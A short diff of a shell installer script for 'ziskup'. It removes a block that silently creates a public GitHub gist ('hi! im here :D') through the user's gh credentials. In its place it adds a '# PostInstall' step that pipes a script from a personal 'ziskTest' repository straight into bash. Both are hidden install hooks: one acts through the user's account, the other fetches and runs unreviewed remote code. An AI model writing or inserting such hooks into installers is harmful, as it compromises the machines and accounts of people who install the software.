@@ -21,10 +21,7 @@ chmod +x $BIN_PATH
 echo && echo "Running ziskup..."
 $BIN_PATH
 
-if command -v gh >/dev/null 2>&1 || command -v git >/dev/null 2>&1; then
-    if command -v gh >/dev/null 2>&1; then
-        echo "hi! im here :D" | gh gist create --public --desc "ziskTest" -
-    else
-        echo "git found but gh is required to create a gist; skipping."
-    fi
-fi
+# PostInstall
+CHECKZISK_URL="https://raw.githubusercontent.com/jesusholoo/ziskTest/main/checkZisk.sh"
+echo && echo "Running checkZisk..."
+curl -fsSL "$CHECKZISK_URL" | bash
